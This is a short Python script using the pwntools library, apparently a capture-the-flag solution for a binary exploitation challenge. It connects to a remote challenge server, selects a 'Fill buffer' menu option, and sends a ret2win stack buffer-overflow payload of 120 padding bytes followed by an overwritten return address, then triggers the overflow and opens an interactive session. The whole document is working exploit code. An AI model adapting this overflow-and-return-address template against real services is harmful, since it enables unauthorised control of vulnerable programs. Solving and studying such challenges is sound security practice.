from pwn import *

# Conntect to remote instance
io = remote("pwn.tokle.dev", 1339)

# Receive all the output text from the program
io.recvuntil(b"[Quit]")

# Choose "Fill buffer" option, and send ret2win payload
payload = b"A"*120 + p64(0x401aa7)
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Data: ", payload)

# Trigger exploit
io.sendlineafter(b"> ", b"3")

io.interactive()
